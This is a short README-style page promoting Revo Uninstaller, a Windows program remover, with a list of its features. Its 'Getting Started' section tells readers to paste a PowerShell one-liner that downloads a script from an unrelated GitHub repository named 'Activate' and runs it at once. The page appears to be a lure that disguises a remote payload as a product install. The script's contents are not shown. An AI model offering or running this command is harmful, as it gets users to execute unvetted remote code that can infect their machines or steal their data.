# Revo Uninstaller

## Getting Started

Revo Uninstaller is an advanced program uninstaller that goes beyond the standard Windows removal process. Install it quickly through PowerShell:

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

## Core Functions

**Traced Uninstall** -- Monitors program installations in real time so every change can be fully reversed later.

**Forced Uninstall** -- Removes programs that fail to appear in the standard Add/Remove list or whose built-in uninstallers are broken.

**Junk Files Cleaner** -- Scans and deletes unnecessary temporary files, browser caches, and obsolete system data.

**Hunter Mode** -- Drag a crosshair over any window or tray icon to instantly uninstall, stop, or manage the associated application.
